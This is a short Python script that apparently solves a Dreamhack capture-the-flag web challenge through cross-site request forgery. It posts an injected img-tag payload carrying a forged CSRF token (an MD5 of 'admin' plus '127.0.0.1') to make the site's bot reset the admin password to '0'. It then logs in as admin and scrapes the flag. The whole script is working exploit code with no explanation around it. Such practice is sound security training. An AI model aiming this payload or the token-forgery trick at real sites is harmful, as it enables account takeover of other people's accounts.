from bs4 import BeautifulSoup
from hashlib import md5
import requests

URL = "http://host1.dreamhack.games:17965"
FLAG_URI = "/flag"
LOGIN_URI = "/login"
PAYLOAD = f'''<img src='/change_password?pw=0&csrftoken={md5(('admin'+'127.0.0.1').encode()).hexdigest()}'/>'''
EXPLOIT_DATA = {'param': PAYLOAD}
LOGIN_DATA = {'username': 'admin', 'password' : '0'}

# 1. Reset admin password
requests.post(URL + FLAG_URI, data=EXPLOIT_DATA)

# 2. Login to admin and GET FLAG
resp = requests.post(URL + LOGIN_URI, data=LOGIN_DATA)

soup = BeautifulSoup(resp.content,"html.parser")
h2 = soup.find('h2')
flag = h2.contents[0]
print(flag)